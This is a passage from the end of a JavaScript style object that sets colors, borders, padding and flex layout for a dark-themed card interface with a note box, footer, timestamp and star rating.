    background: "transparent",
    border: "none",
    color: "#9ca3af",
    cursor: "pointer",
    fontSize: 14,
    padding: "2px 4px",
  },
  noteBox: {
    backgroundColor: "#181820",
    border: "1px solid #2f313e",
    borderRadius: 6,
    padding: "6px 8px",
    fontSize: 12,
    color: "#d1d5db",
  },
  cardFooter: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    marginTop: 6,
    paddingTop: 8,
    borderTop: "1px solid #2c2e3a",
  },
  timestamp: {
    fontSize: 11,
    color: "#6b7280",
  },
  footerRight: {
    display: "flex",
    alignItems: "center",
    gap: 8,
  },
  stars: {
    fontSize: 13,
    letterSpacing: 1,
  },
};
